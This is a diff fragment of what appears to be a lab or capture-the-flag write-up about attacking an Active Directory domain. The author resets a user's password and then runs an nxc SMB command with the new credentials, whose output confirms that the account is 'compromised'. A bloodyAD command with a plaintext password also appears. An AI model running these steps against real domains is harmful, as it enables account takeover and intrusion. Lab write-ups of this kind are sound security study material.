@@ -601,5 +601,10 @@ bloodyAD --host dc.novaforge.local -d novaforge.local -u m.lee -p '0816mypasswor
 Since its a lab environment, ill just change the users password!
 
 ```python
-
+nxc smb dc.novaforge.local -u steve.wills -p 'Password123!' --smb-timeout 5
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\steve.wills:Password123!
 ```
+
+This user is now compromised!
+
